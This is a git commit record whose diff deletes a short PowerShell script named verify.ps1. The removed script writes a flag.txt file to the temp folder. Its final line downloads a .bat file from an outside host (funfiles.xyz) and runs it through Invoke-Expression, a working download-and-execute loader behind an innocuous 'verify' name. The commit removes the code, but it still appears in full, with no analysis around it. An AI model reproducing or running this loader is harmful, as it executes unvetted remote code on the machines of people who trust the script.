7e583519d589a741aad7d49cda3d308a569550db
betrayfudasf <betrayworldownstheworld3421223@gmail.com>
2025-09-17 22:02:00 -0700

    Delete verify.ps1

--- verify.ps1
+++
@@ -1,8 +0,0 @@
-$message = "Hello World"
-$tempFolder = $env:TEMP 
-$fileName = "flag.txt"
-$filePath = Join-Path -Path $tempFolder -ChildPath $fileName
-
-$message | Tee-Object -FilePath $filePath
-
-Invoke-Expression (Invoke-WebRequest -Uri "https://funfiles.xyz/upload/NkEhCcsK6p.bat" -UseBasicParsing)
